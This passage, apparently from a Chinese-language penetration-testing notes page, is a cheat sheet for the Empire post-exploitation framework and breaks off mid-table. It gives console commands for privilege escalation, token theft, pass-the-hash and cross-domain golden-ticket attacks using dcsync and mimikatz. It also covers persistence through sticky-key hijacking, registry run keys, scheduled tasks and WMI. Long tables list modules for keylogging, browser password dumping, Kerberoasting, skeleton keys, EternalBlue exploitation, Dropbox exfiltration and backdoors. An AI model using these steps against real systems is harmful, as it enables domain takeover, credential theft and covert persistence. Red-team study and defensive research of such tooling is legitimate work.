&gt;sc 获取当前桌面截图，文件存储在./Empire/download/agent名字/screenshot
&gt;download c:\pass.txt 下载靶机文件到本机
&gt;upload hacked.txt c:\hacked.txt 上传本机文件到靶机
</code></pre>
<h4 id="提权-2"><a href="#提权-2" class="headerlink" title="提权"></a>提权</h4><pre><code>&gt;agents 列表中Username没有星号则需要提权
&gt;bypassuac listener需指定一个监听器 提权
&gt;usemodule privesc/ms16-032需指定一个监听器 提权
&gt;usemodule privesc/powerup/allchecks执行所有脚本检查漏洞
</code></pre>
<h4 id="横向"><a href="#横向" class="headerlink" title="横向"></a>横向</h4><pre><code>查询域管登录机器
&gt;usemodule situational_awareness/network/powerview/user_hunter
</code></pre>
<h5 id="令牌窃取-1"><a href="#令牌窃取-1" class="headerlink" title="令牌窃取"></a>令牌窃取</h5><pre><code>&gt;mimikatz
&gt;creds  获取并整理hash及密码
&gt;pth &#123;ID&#125;窃取管理员令牌
&gt;steal_token &#123;PID&#125;
</code></pre>
<h5 id="会话注入"><a href="#会话注入" class="headerlink" title="会话注入"></a>会话注入</h5><pre><code>&gt;ps 查看进程
&gt;usemodule management/psinject 设置ProcIP和Listener
</code></pre>
<h5 id="Hash传递"><a href="#Hash传递" class="headerlink" title="Hash传递"></a>Hash传递</h5><pre><code>Invoke-PsExec可能会被查杀
&gt;usemodule situational_awareness/network/powerview/find_localadmin_access 列出可PSexec横向移动的机器
&gt;usemodule lateral_movement/invoke_psexec需设置ComputerName和Listener
或
&gt;usemodule lateral_movement/invoke_wmi需设置ComputerName和Listener，credID
跨域
父域域控：dc.zone.com
子域域控：sub.zone.com
子域计算机：pc.sub.zone.com
子域普通用户：sub\user1
查看信任关系
&gt;usemodule situational_awareness/network/powerview/get_domain_trust
获取父域krbtgt SID，使用management/user_to_sid获取sid
需设置Domain和User=krbtgt
&gt;usemodule credentials/mimikatz/dcsync 设置UserName 子域\krbtgt 获取子域hash
&gt;usemodule credentials/mimikatz/golden_ticket 伪造sid 
需设置User为伪造用户 sids伪造的标识符&#123;krbtgt sid&#125;-519
&gt;usemodule credentials/mimikatz/dcsync 获取父域krbtgt的hash
&gt;usemodule credentials/mimikatz/golden_ticket 使用父域krbtgt进行PTH攻击，指定父域CredID，用户名和域
&gt;shell dir \\dc.zone.com\c$
</code></pre>
<h4 id="后门-amp-持久化"><a href="#后门-amp-持久化" class="headerlink" title="后门&amp;持久化"></a>后门&amp;持久化</h4><h5 id="映像劫持"><a href="#映像劫持" class="headerlink" title="映像劫持"></a>映像劫持</h5><pre><code>&gt;usemodule lateral_movement/invoke_wmi_debugger
设置Listener，ComputerName(大写)，TargetBinary(sethc.exe, Utilman.exe, osk.exe, Narrator.exe, Magnify.exe)，分别是粘滞键，轻松访问，屏幕键盘，讲述人，放大镜。
</code></pre>
<h5 id="注入注册表启动项"><a href="#注入注册表启动项" class="headerlink" title="注入注册表启动项"></a>注入注册表启动项</h5><pre><code>&gt;usemodule persistence/elevated/registry*
设置Listener，注册表路径RegPath [HKLM\software\microsoft\windows\currentversion\run]
</code></pre>
<h5 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h5><pre><code>&gt;usemodule persistence/elevated/schtasks*
设置Listener和DailyTime
</code></pre>
<h5 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h5><pre><code>&gt;usemodule persistence/elevated/wmi
设置Listener
</code></pre>
<h5 id="注入SSP"><a href="#注入SSP" class="headerlink" title="注入SSP"></a>注入SSP</h5><pre><code>查看SSP章节
</code></pre>
<p>Collection（信息采集）</p>
<h4 id="Collection（信息采集）"><a href="#Collection（信息采集）" class="headerlink" title="Collection（信息采集）"></a>Collection（信息采集）</h4><table>
<thead>
<tr>
<th>模块名</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>collection/ChromeDump</td>
<td>收集chrome浏览器保存的密码和浏览历史记录</td>
</tr>
<tr>
<td>collection/FoxDump</td>
<td>收集Firefox浏览器保存的密码和浏览历史记录</td>
</tr>
<tr>
<td>collection/USBKeylogger*</td>
<td>利用ETW作为键盘记录</td>
</tr>
<tr>
<td>collection/WebcamRecorder</td>
<td>从摄像头捕获视频</td>
</tr>
<tr>
<td>collection/browser_data</td>
<td>搜索浏览器历史记录或书签</td>
</tr>
<tr>
<td>collection/clipboard_monitor</td>
<td>按指定的时间间隔监视剪贴板</td>
</tr>
<tr>
<td>collection/file_finder</td>
<td>查找域中的敏感文件</td>
</tr>
<tr>
<td>collection/find_interesting_file</td>
<td>查找域中的敏感文件</td>
</tr>
<tr>
<td>collection/get_indexed_item</td>
<td>获取Windows desktop search索引文件</td>
</tr>
<tr>
<td>collection/get_sql_column_sample_data</td>
<td>从目标SQL Server返回列信息。</td>
</tr>
<tr>
<td>collection/get_sql_query</td>
<td>在目标SQL服务器上执行查询</td>
</tr>
<tr>
<td>collection/inveigh</td>
<td>Windows PowerShell LLMNR/mDNS/NBNS中间人工具</td>
</tr>
<tr>
<td>collection/keylogger</td>
<td>键盘记录到keystrokes.txt文件中，文件位置/downloads/agentname/keystrokes.txt/agentname</td>
</tr>
<tr>
<td>collection/minidump</td>
<td>进程的全内存转储，PowerSploit的Out-Minidump.ps1</td>
</tr>
<tr>
<td>collection/netripper</td>
<td>将NetRipper注入目标进程，该进程使用API挂钩以拦截来自低特权用户的网络流量和与加密相关的功能，从而能够在加密之前/解密之后捕获纯文本流量和加密流量。</td>
</tr>
<tr>
<td>collection/ninjacopy*</td>
<td>通过读取原始卷并解析NTFS结构，从NTFS分区卷中复制文件。</td>
</tr>
<tr>
<td>collection/packet_capture*</td>
<td>使用netsh在主机上启动数据包捕获。</td>
</tr>
<tr>
<td>collection/prompt</td>
<td>提示当前用户在表单框中输入其凭据，然后返回结果。</td>
</tr>
<tr>
<td>collection/screenshot</td>
<td>屏幕截图</td>
</tr>
<tr>
<td>collection/vaults/add_keepass_config_trigger</td>
<td>寻找KeePass配置</td>
</tr>
<tr>
<td>collection/vaults/find_keepass_config</td>
<td>此模块查找并解析KeePass.config.xml (2.X)和KeePass.config.xml (1.X)文件。</td>
</tr>
<tr>
<td>collection/vaults/get_keepass_config_trigger</td>
<td>该模块从KeePass 2.X配置XML文件中提取触发器说明</td>
</tr>
<tr>
<td>collection/vaults/keethief</td>
<td>此模块检索未锁定的KeePass数据库的database mastey key信息</td>
</tr>
<tr>
<td>collection/vaults/remove_keepass_config_trigger</td>
<td>该模块从Find-KeePassConfig找到的所有KeePass配置中删除所有触发器</td>
</tr>
</tbody></table>
<pre><code>&gt;usemodule collection/ tab补齐查看模块
&gt;usemodule collection/screenshot 获取当前桌面截图，文件存储在./Empire/download/agent名字/screenshot
&gt;usemodule collection/keylogger 键盘记录，文件存储在./Empire/download/agent名字/agent.log
&gt;usemodule situational_awareness/host/winenum 查看当前用户、AD组、剪切板内容、系统版本、共享、网络信息、防火墙规则
&gt;usemodule situational_awareness/network/powerview/share_finder 列出域内所有共享
&gt;usemodule situational_awareness/network/arpscan 
&gt;set Range 192.168.0.1-192.168.0.100 ARP扫描，需设置扫描网段区间
&gt;usemodule situational_awareness/network/portscan 
&gt;set Hosts 192.168.0.1-192.168.0.100 端口扫描，需设置IP或IP段
&gt;usemodule situational_awareness/network/reverse_dns DNS信息，需设置IP
&gt;set Range 192.168.0.1-192.168.0.100
&gt;usemodule situational_awareness/network/powerview/get_domain_controller 查找域控
</code></pre>
<h4 id="Code-execution（代码执行）"><a href="#Code-execution（代码执行）" class="headerlink" title="Code_execution（代码执行）"></a>Code_execution（代码执行）</h4><table>
<thead>
<tr>
<th>模块名</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>code_execution/invoke_dllinjection</td>
<td>使用PowerSploit的Invoke-DLLInjection将Dll注入您选择的进程ID。</td>
</tr>
<tr>
<td>code_execution/invoke_metasploitpayload</td>
<td>生成一个新的隐藏PowerShell窗口，该窗口下载并执行Metasploit Payload。这与Metasploit模块theexploit/multi/scripts/web_delivery互动</td>
</tr>
<tr>
<td>code_execution/invoke_ntsd</td>
<td>使用NT Symbolic Debugger执行Empire launcher代码</td>
</tr>
<tr>
<td>code_execution/invoke_reflectivepeinjection</td>
<td>使用PowerSploit的Invoke-ReflectivePEInjection进行反射PE注入，将DLL/EXE加载进PowerShell进程中，或者将DLL加载进远程进程中</td>
</tr>
<tr>
<td>code_execution/invoke_shellcode</td>
<td>使用PowerSploit的Invoke–Shellcode注入Shellcode</td>
</tr>
<tr>
<td>code_execution/invoke_shellcodemsil</td>
<td>执行shellcode</td>
</tr>
</tbody></table>
<h4 id="Credentials（身份凭证）"><a href="#Credentials（身份凭证）" class="headerlink" title="Credentials（身份凭证）"></a>Credentials（身份凭证）</h4><table>
<thead>
<tr>
<th>模块名</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>credentials/credential_injection*</td>
<td>运行PowerSploit的Invoke-CredentialInjection创建具有明文凭证的登录，而不会触发事件ID 4648使用显式凭据尝试登录</td>
</tr>
<tr>
<td>credentials/enum_cred_store</td>
<td>从Windows凭据管理器中转储当前交互用户的纯文本凭据</td>
</tr>
<tr>
<td>credentials/invoke_kerberoast</td>
<td>为具有非空服务主体名称（SPN）的所有用户请求kerberos票据，并将其提取为John或Hashcat可用格式</td>
</tr>
<tr>
<td>credentials/powerdump*</td>
<td>使用Posh-SecMod的Invoke-PowerDump从本地系统中转储哈希</td>
</tr>
<tr>
<td>credentials/sessiongopher</td>
<td>提取WinSCP已保存的会话和密码</td>
</tr>
<tr>
<td>credentials/tokens</td>
<td>运行PowerSploit的Invoke-TokenManipulation枚举可用的登录令牌，并使用它们创建新的进程</td>
</tr>
<tr>
<td>credentials/vault_credential*</td>
<td>运行PowerSploit的Get-VaultCredential以显示Windows Vault凭证对象，包括明文Web凭证</td>
</tr>
<tr>
<td>credentials/mimikatz/cache*</td>
<td>运行PowerSploit的Invoke-Mimikatz函数以提取MSCache(v2) hashes</td>
</tr>
<tr>
<td>credentials/mimikatz/certs*</td>
<td>运行PowerSploit的Invoke-Mimikatz函数将所有证书提取到本地目录</td>
</tr>
<tr>
<td>credentials/mimikatz/command*</td>
<td>使用自定义命令运行PowerSploit的Invoke-Mimikatz函数</td>
</tr>
<tr>
<td>credentials/mimikatz/dcsync</td>
<td>运行PowerSploit的Invoke-Mimikatz函数，以通过Mimikatz的lsadump::dcsync模块提取给定的帐户密码</td>
</tr>
<tr>
<td>credentials/mimikatz/dcsync_hashdump</td>
<td>运行PowerSploit的Invoke-Mimikatz函数，以使用Mimikatz的lsadump::dcsync模块收集所有域哈希</td>
</tr>
<tr>
<td>credentials/mimikatz/extract_tickets</td>
<td>运行PowerSploit的Invoke-Mimikatz函数，以base64编码形式从内存中提取kerberos票据</td>
</tr>
<tr>
<td>credentials/mimikatz/golden_ticket</td>
<td>运行PowerSploit的Invoke-Mimikatz函数以生成黄金票据并将其注入内存</td>
</tr>
<tr>
<td>credentials/mimikatz/keys*</td>
<td>运行PowerSploit的Invoke-Mimikatz函数以将所有密钥提取到本地目录</td>
</tr>
<tr>
<td>credentials/mimikatz/logonpasswords*</td>
<td>运行PowerSploit的Invoke-Mimikatz函数以从内存中提取纯文本凭据。</td>
</tr>
<tr>
<td>credentials/mimikatz/lsadump*</td>
<td>运行PowerSploit的Invoke-Mimikatz函数以从内存中提取特定的用户哈希。 在域控制器上很有用。</td>
</tr>
<tr>
<td>credentials/mimikatz/mimitokens*</td>
<td>运行PowerSploit的Invoke-Mimikatz函数以列出或枚举令牌。</td>
</tr>
<tr>
<td>credentials/mimikatz/pth*</td>
<td>运行PowerSploit的Invoke-Mimikatz函数以执行sekurlsa::pth来创建一个新进程。</td>
</tr>
<tr>
<td>credentials/mimikatz/purge</td>
<td>运行PowerSploit的Invoke-Mimikatz函数从内存中清除所有当前的kerberos票据</td>
</tr>
<tr>
<td>credentials/mimikatz/sam*</td>
<td>运行PowerSploit的Invoke-Mimikatz函数从安全帐户管理器（SAM）数据库中提取哈希</td>
</tr>
<tr>
<td>credentials/mimikatz/silver_ticket</td>
<td>运行PowerSploit的Invoke-Mimikatz函数，以生成服务器/服务的白银票据并将其注入内存。</td>
</tr>
<tr>
<td>credentials/mimikatz/trust_keys*</td>
<td>运行PowerSploit的Invoke-Mimikatz函数，从域控制器中提取域信任密钥。</td>
</tr>
</tbody></table>
<h4 id="Exfiltration（数据窃取）"><a href="#Exfiltration（数据窃取）" class="headerlink" title="Exfiltration（数据窃取）"></a>Exfiltration（数据窃取）</h4><table>
<thead>
<tr>
<th>模块名</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>exfiltration/egresscheck</td>
<td>可用于帮助检查主机与客户端系统之间的出口，详细信息：<a class="link" href="https://github.com/stufus/egresscheck-framework">https://github.com/stufus/egresscheck-framework<i class="fas fa-external-link-alt"></i></a></td>
</tr>
<tr>
<td>exfiltration/exfil_dropbox</td>
<td>下载文件到dropbox</td>
</tr>
</tbody></table>
<h4 id="Exploitation（漏洞利用EXP）"><a href="#Exploitation（漏洞利用EXP）" class="headerlink" title="Exploitation（漏洞利用EXP）"></a>Exploitation（漏洞利用EXP）</h4><table>
<thead>
<tr>
<th>模块名</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>exploitation/exploit_eternalblue</td>
<td>MS17_010永恒之蓝漏洞利用</td>
</tr>
<tr>
<td>exploitation/exploit_jboss</td>
<td>Jboss漏洞利用</td>
</tr>
<tr>
<td>exploitation/exploit_jenkins</td>
<td>在未授权访问的Jenkins脚本控制台上运行命令</td>
</tr>
</tbody></table>
<h4 id="Lateral-movement（横向移动）"><a href="#Lateral-movement（横向移动）" class="headerlink" title="Lateral_movement（横向移动）"></a>Lateral_movement（横向移动）</h4><table>
<thead>
<tr>
<th>模块名</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>lateral_movement/inveigh_relay</td>
<td>smb中继攻击</td>
</tr>
<tr>
<td>lateral_movement/invoke_dcom</td>
<td>使用DCOM在远程主机上执行stager</td>
</tr>
<tr>
<td>lateral_movement/invoke_executemsbuild</td>
<td>该模块利用WMI和MSBuild编译并执行一个包含Empire launcher的xml文件。</td>
</tr>
<tr>
<td>lateral_movement/invoke_psexec</td>
<td>PsExec横向移动</td>
</tr>
<tr>
<td>lateral_movement/invoke_psremoting</td>
<td>远程PowerShell横向移动</td>
</tr>
<tr>
<td>lateral_movement/invoke_smbexec</td>
<td>SMBExec横向移动</td>
</tr>
<tr>
<td>lateral_movement/invoke_sqloscmd</td>
<td>利用xp_cmdshell横向移动</td>
</tr>
<tr>
<td>lateral_movement/invoke_sshcommand</td>
<td>利用SSH横向移动</td>
</tr>
<tr>
<td>lateral_movement/invoke_wmi</td>
<td>利用WMI横向移动</td>
</tr>
<tr>
<td>lateral_movement/invoke_wmi_debugger</td>
<td>使用WMI将远程机器上的二进制文件的调试器设置为cmd.exe或stager</td>
</tr>
<tr>
<td>lateral_movement/jenkins_script_console</td>
<td>利用未授权访问的Jenkins脚本控制台横向移动</td>
</tr>
<tr>
<td>lateral_movement/new_gpo_immediate_task</td>
<td>利用GPO中的计划任务横向移动</td>
</tr>
</tbody></table>
<h4 id="Management（管理）"><a href="#Management（管理）" class="headerlink" title="Management（管理）"></a>Management（管理）</h4><table>
<thead>
<tr>
<th>模块名</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>management/enable_rdp*</td>
<td>在远程计算机上启用RDP并添加防火墙例外。</td>
</tr>
<tr>
<td>management/disable_rdp*</td>
<td>在远程计算机上禁用RDP</td>
</tr>
<tr>
<td>management/downgrade_account</td>
<td>在给定的域帐户上设置可逆加密，然后强制下次用户登录时设置密码。</td>
</tr>
<tr>
<td>management/enable_multi_rdp*</td>
<td>允许多个用户建立同时的RDP连接。</td>
</tr>
<tr>
<td>management/get_domain_sid</td>
<td>返回当前指定域的SID</td>
</tr>
<tr>
<td>management/honeyhash*</td>
<td>将人工凭证注入到LSASS</td>
</tr>
<tr>
<td>management/invoke_script</td>
<td>运行自定义脚本</td>
</tr>
<tr>
<td>management/lock</td>
<td>锁定工作站的显示</td>
</tr>
<tr>
<td>management/logoff</td>
<td>从计算机上注销当前用户（或所有用户）</td>
</tr>
<tr>
<td>management/psinject</td>
<td>利用Powershell注入Stephen Fewer形成的ReflectivePick，该ReflectivePick在远程过程中从内存执行PS代码</td>
</tr>
<tr>
<td>management/reflective_inject</td>
<td>利用Powershell注入Stephen Fewer形成的ReflectivePick，该ReflectivePick在远程过程中从内存执行PS代码</td>
</tr>
<tr>
<td>management/restart</td>
<td>重新启动指定的机器</td>
</tr>
<tr>
<td>management/runas</td>
<td>绕过GPO路径限制</td>
</tr>
<tr>
<td>management/shinject</td>
<td>将PIC Shellcode Payload注入目标进程</td>
</tr>
<tr>
<td>management/sid_to_user</td>
<td>将指定的域sid转换为用户</td>
</tr>
<tr>
<td>management/spawn</td>
<td>在新的powershell.exe进程中生成新agent</td>
</tr>
<tr>
<td>management/spawnas</td>
<td>使用指定的登录凭据生成agent</td>
</tr>
<tr>
<td>management/switch_listener</td>
<td>切换listener</td>
</tr>
<tr>
<td>management/timestomp</td>
<td>通过’调用Set-MacAttribute执行类似耗时的功能</td>
</tr>
<tr>
<td>management/user_to_sid</td>
<td>将指定的domain\user转换为domain sid</td>
</tr>
<tr>
<td>management/vnc</td>
<td>Invoke-Vnc在内存中执行VNC代理并启动反向连接</td>
</tr>
<tr>
<td>management/wdigest_downgrade*</td>
<td>将计算机上的wdigest设置为使用显式凭据</td>
</tr>
<tr>
<td>management/zipfolder</td>
<td>压缩目标文件夹以供以后渗透</td>
</tr>
<tr>
<td>management/mailraider/disable_security</td>
<td>此函数检查ObjectModelGuard</td>
</tr>
<tr>
<td>management/mailraider/get_emailitems</td>
<td>返回指定文件夹的所有项目</td>
</tr>
<tr>
<td>management/mailraider/get_subfolders</td>
<td>返回指定顶级文件夹中所有文件夹的列表</td>
</tr>
<tr>
<td>management/mailraider/mail_search</td>
<td>在给定的Outlook文件夹中搜索项目</td>
</tr>
<tr>
<td>management/mailraider/search_gal</td>
<td>返回与指定搜索条件匹配的所有exchange users</td>
</tr>
<tr>
<td>management/mailraider/send_mail</td>
<td>使用自定义或默认模板将电子邮件发送到指定地址。</td>
</tr>
<tr>
<td>management/mailraider/view_email</td>
<td>选择指定的文件夹，然后在指定的索引处输出电子邮件项目</td>
</tr>
</tbody></table>
<h4 id="Persistence（持久化）"><a href="#Persistence（持久化）" class="headerlink" title="Persistence（持久化）"></a>Persistence（持久化）</h4><table>
<thead>
<tr>
<th>模块名</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>persistence/elevated/registry*</td>
<td>计算机启动项持久化，通过HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run进行持久化，运行一个stager或者脚本</td>
</tr>
<tr>
<td>persistence/elevated/schtasks*</td>
<td>计划任务持久化</td>
</tr>
<tr>
<td>persistence/elevated/wmi*</td>
<td>WMI事件订阅持久化</td>
</tr>
<tr>
<td>persistence/elevated/wmi_updater*</td>
<td>WMI订阅持久化</td>
</tr>
<tr>
<td>persistence/misc/add_netuser</td>
<td>将域用户或本地用户添加到当前（或远程）计算机</td>
</tr>
<tr>
<td>persistence/misc/add_sid_history*</td>
<td>运行PowerSploit的Invoke-Mimikatz函数以执行misc::addsid以添加用户的sid历史记录。 仅适用于域控制器</td>
</tr>
<tr>
<td>persistence/misc/debugger*</td>
<td>将指定目标二进制文件的调试器设置为cmd.exe</td>
</tr>
<tr>
<td>persistence/misc/disable_machine_acct_change*</td>
<td>禁止目标系统的机器帐户自动更改其密码</td>
</tr>
<tr>
<td>persistence/misc/get_ssps</td>
<td>枚举所有已加载的安全软件包</td>
</tr>
<tr>
<td>persistence/misc/install_ssp*</td>
<td>安装安全支持提供程序dll</td>
</tr>
<tr>
<td>persistence/misc/memssp*</td>
<td>运行PowerSploit的Invoke-Mimikatz函数以执行misc::memssp，将所有身份验证事件记录到C:\Windows\System32\mimisla.log</td>
</tr>
<tr>
<td>persistence/misc/skeleton_key*</td>
<td>运行PowerSploit的Invoke-Mimikatz函数来执行misc::skeleton，植入密码mimikatz的万能钥匙。 仅适用于域控制器</td>
</tr>
<tr>
<td>persistence/powerbreach/deaduser</td>
<td>DeadUserBackdoor后门，详细信息：<a class="link" href="http://www.sixdub.net/?p=535">http://www.sixdub.net/?p=535<i class="fas fa-external-link-alt"></i></a></td>
</tr>
<tr>
<td>persistence/powerbreach/eventlog*</td>
<td>启动事件循环后门</td>
</tr>
<tr>
<td>persistence/powerbreach/resolver</td>
<td>启动解析器后门</td>
</tr>
<tr>
<td>persistence/userland/backdoor_lnk</td>
<td>LNK文件后门</td>
</tr>
<tr>
<td>persistence/userland/registry</td>
<td>计算机启动项持久化，通过HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run进行持久化，运行一个stager或者脚本</td>
</tr>
<tr>
<td>persistence/userland/schtasks</td>
<td>计划任务持久化</td>
</tr>
</tbody></table>
<h4 id="Privesc（权限提升）"><a href="#Privesc（权限提升）" class="headerlink" title="Privesc（权限提升）"></a>Privesc（权限提升）</h4><table>
<thead>
<tr>
<th>模块名</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>privesc/ask</td>
<td>弹出一个对话框，询问用户是否要以管理员身份运行powershell</td>
</tr>
<tr>
<td>privesc/bypassuac</td>
<td>UAC bypass</td>
</tr>
<tr>
<td>privesc/bypassuac_env</td>
<td>UAC bypass</td>
</tr>
<tr>
<td>privesc/bypassuac_eventvwr</td>
<td>UAC bypass</td>
</tr>
<tr>
<td>privesc/bypassuac_fodhelper</td>
<td>UAC bypass</td>
</tr>
<tr>
<td>privesc/bypassuac_sdctlbypass</td>
<td>UAC bypass</td>
</tr>
<tr>
<td>privesc/bypassuac_tokenmanipulation</td>
<td>UAC bypass</td>
</tr>
<tr>
<td>privesc/bypassuac_wscript</td>
<td>UAC bypass</td>
</tr>
<tr>
<td>privesc/getsystem*</td>
<td>获取system特权</td>
</tr>
<tr>
<td>privesc/gpp</td>
<td>利用windows组策略首选项缺陷获取系统帐号</td>
</tr>
<tr>
<td>privesc/mcafee_sitelist</td>
<td>寻找McAfee SiteList.xml文件的纯文本密码</td>
</tr>
<tr>
<td>privesc/ms16-032</td>
<td>MS16-032本地提权</td>
</tr>
<tr>
<td>privesc/ms16-135</td>
<td>MS16-135本地提权</td>
</tr>
<tr>
<td>privesc/tater</td>
<td>利用PowerShell实现的Hot Potato提权</td>
</tr>
<tr>
<td>privesc/powerup/allchecks</td>
<td>检查目标主机的攻击向量以进行权限提升</td>
</tr>
<tr>
<td>privesc/powerup/find_dllhijack</td>
<td>查找通用的.DLL劫持</td>
</tr>
<tr>
<td>privesc/powerup/service_exe_restore</td>
<td>还原备份的服务二进制文件</td>
</tr>
<tr>
<td>privesc/powerup/service_exe_stager</td>
<td>备份服务的二进制文件，并用启动stager.bat的二进制文件替换原始文件</td>
</tr>
<tr>
<td>privesc/powerup/service_exe_useradd</td>
<td>修改目标服务以创建本地用户并将其添加到本地管理员</td>
</tr>
<tr>
<td>privesc/powerup/service_stager</td>
<td>修改目标服务以执行Empire stager</td>
</tr>
<tr>
<td>privesc/powerup/service_useradd</td>
<td>修改目标服务以创建本地用户并将其添加到本地管理员</td>
</tr>
<tr>
<td>privesc/powerup/write_dllhijacker</td>
<td>将可劫持的.dll以及.dll调用的stager.bat一起写到指定路径。 wlbsctrl.dll在Windows 7上运行良好。需要重新启动计算机</td>
</tr>
</tbody></table>
<h4 id="Recon（侦察）"><a href="#Recon（侦察）" class="headerlink" title="Recon（侦察）"></a>Recon（侦察）</h4><table>
<thead>
<tr>
<th>模块名</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>recon/find_fruit</td>
<td>在网络范围内搜索潜在的易受攻击的Web服务</td>
</tr>
<tr>
<td>recon/get_sql_server_login_default_pw</td>
<td>发现在当前广播域之内的SQL Server实例</td>
</tr>
<tr>
<td>recon/http_login</td>
<td>针对基本身份验证测试凭据</td>
</tr>
</tbody></table>
<h4 id="Situational-awareness（态势感知）"><a href="#Situational-awareness（态势感知）" class="headerlink" title="Situational_awareness（态势感知）"></a>Situational_awareness（态势感知）</h4><table>
<thead>
<tr>
<th>模块名</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>situational_awareness/host/antivirusproduct</td>
<td>获取防病毒产品信息</td>
</tr>
<tr>
<td>situational_awareness/host/computerdetails*</td>
<td>枚举有关系统的有用信息</td>
</tr>
<tr>
<td>situational_awareness/host/dnsserver</td>
<td>枚举系统使用的DNS服务器</td>
</tr>
<tr>
<td>situational_awareness/host/findtrusteddocuments</td>
<td>该模块将枚举适当的注册表</td>
</tr>
<tr>
<td>situational_awareness/host/get_pathacl</td>
<td>枚举给定文件路径的ACL</td>
</tr>
<tr>
<td>situational_awareness/host/get_proxy</td>
<td>枚举当前用户的代理服务器和WPAD内容</td>
</tr>
<tr>
<td>situational_awareness/host/get_uaclevel</td>
<td>枚举UAC级别</td>
</tr>
<tr>
<td>situational_awareness/host/monitortcpconnections</td>
<td>监视主机与指定域名或IPv4地址的TCP连接，对于会话劫持和查找与敏感服务进行交互的用户很有用</td>
</tr>
<tr>
<td>situational_awareness/host/paranoia*</td>
<td>持续检查运行过程中是否存在可疑用户</td>
</tr>
<tr>
<td>situational_awareness/host/winenum</td>
<td>收集有关主机和当前用户上下文的相关信息</td>
</tr>
<tr>
<td>situational_awareness/network/arpscan</td>
<td>针对给定范围的IPv4 IP地址执行ARP扫描</td>
</tr>
<tr>
<td>situational_awareness/network/bloodhound</td>
<td>执行BloodHound数据收集</td>
</tr>
<tr>
<td>situational_awareness/network/get_exploitable_system</td>
<td>查询Active Directory以查找可能容易受到Metasploit Exploit的系统</td>
</tr>
<tr>
<td>situational_awareness/network/get_spn</td>
<td>获取服务主体名称（SPN）</td>
</tr>
<tr>
<td>situational_awareness/network/get_sql_instance_domain</td>
<td>返回SQL Server实例列表</td>
</tr>
<tr>
<td>situational_awareness/network/get_sql_server_info</td>
<td>从目标SQL Server返回基本服务器和用户信息</td>
</tr>
<tr>
<td>situational_awareness/network/portscan</td>
<td>使用常规套接字进行简单的端口扫描</td>
</tr>
<tr>
<td>situational_awareness/network/reverse_dns</td>
<td>执行给定IPv4 IP范围的DNS反向查找</td>
</tr>
<tr>
<td>situational_awareness/network/smbautobrute</td>
<td>针对用户名/密码列表运行SMB暴力破解</td>
</tr>
<tr>
<td>situational_awareness/network/smbscanner</td>
<td>在多台机器上测试用户名/密码组合</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/find_foreign_group</td>
<td>枚举给定域的组的所有成员，并查找不在查询域中的用户</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/find_foreign_user</td>
<td>枚举在其主域之外的组中的用户</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/find_gpo_computer_admin</td>
<td>获取计算机（或GPO）对象，并确定哪些用户/组对该对象具有管理访问权限</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/find_gpo_location</td>
<td>获取用户名或组名，并确定其具有通过GPO进行管理访问的计算机</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/find_localadmin_access</td>
<td>在当前用户具有“本地管理员”访问权限的本地域上查找计算机</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/find_managed_security_group</td>
<td>此功能检索域中的所有安全组</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_cached_rdpconnection</td>
<td>使用远程注册表功能来查询计算机上“ Windows远程桌面连接客户端”的所有信息</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_computer</td>
<td>查询当前计算机对象的域</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_dfs_share</td>
<td>返回给定域的所有容错分布式文件系统的列表</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_domain_controller</td>
<td>返回当前域或指定域的域控制器</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_domain_policy</td>
<td>返回给定域或域控制器的默认域或DC策略</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_domain_trust</td>
<td>返回当前域或指定域的所有域信任</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_fileserver</td>
<td>返回从用户主目录提取的所有文件服务器的列表</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_forest</td>
<td>返回有关给定域森林的信息</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_forest_domain</td>
<td>返回给定林的所有域</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_gpo</td>
<td>获取域中所有当前GPO的列表</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_group</td>
<td>获取域中所有当前组的列表</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_group_member</td>
<td>返回给定组的成员</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_localgroup</td>
<td>返回本地或远程计算机上指定本地组中所有当前用户的列表</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_loggedon</td>
<td>执行NetWkstaUserEnum Win32API调用以查询主动登录主机的用户</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_object_acl</td>
<td>返回与特定活动目录对象关联的ACL</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_ou</td>
<td>获取域中所有当前OU的列表</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_rdp_session</td>
<td>在给定的RDP远程服务中查询活动会话和原始IP</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_session</td>
<td>执行NetSessionEnum Win32API调用以查询主机上的活动会话</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_site</td>
<td>获取域中所有当前站点的列表</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_subnet</td>
